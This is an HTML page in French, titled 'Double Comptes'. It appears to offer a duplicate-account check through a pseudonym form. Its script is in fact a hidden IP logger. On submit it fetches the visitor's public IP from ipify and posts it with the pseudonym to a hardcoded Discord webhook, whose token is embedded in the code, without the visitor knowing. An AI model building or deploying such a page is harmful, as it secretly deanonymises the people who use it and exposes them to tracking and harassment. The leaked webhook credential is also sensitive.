<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Double Comptes</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(to right, #6a11cb, #2575fc);
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            text-align: center;
            background: rgba(255, 255, 255, 0.1);
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
        }
        h1 {
            margin-bottom: 20px;
        }
        input[type="text"] {
            padding: 10px;
            border: none;
            border-radius: 5px;
            width: 80%;
            margin-bottom: 20px;
        }
        input[type="submit"] {
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            background-color: #2575fc;
            color: white;
            cursor: pointer;
            font-size: 16px;
        }
        input[type="submit"]:hover {
            background-color: #6a11cb;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Bienvenue sur le site</h1>
        <form id="pseudoForm">
            <input type="text" id="pseudo" name="pseudo" placeholder="Entrez votre pseudo" required>
            <input type="submit" value="Verifier">
        </form>
    </div>
    <script>
        document.getElementById('pseudoForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            const pseudo = document.getElementById('pseudo').value;

            try {
                // Obtenir l'IP du visiteur
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                const ip = data.ip;

                // URL du webhook Discord
                const webhookUrl = 'https://discord.com/api/webhooks/1219213906661347329/chYn276egcy1hK6jU-G2D1ZkT6zW1WlApMlOCbFSTTZJugAiPSiKnqVTLHke2iA3zXO1';

                // Envoyer l'IP et le pseudo au webhook Discord
                await fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        content: `Nouveau visiteur : ${pseudo} (IP : ${ip})`
                    })
                });

                console.log('IP et pseudo envoyés à Discord');
            } catch (error) {
                console.error('Erreur lors de l\'envoi de l\'IP et du pseudo à Discord', error);
            }
        });
    </script>
</body>
</html>
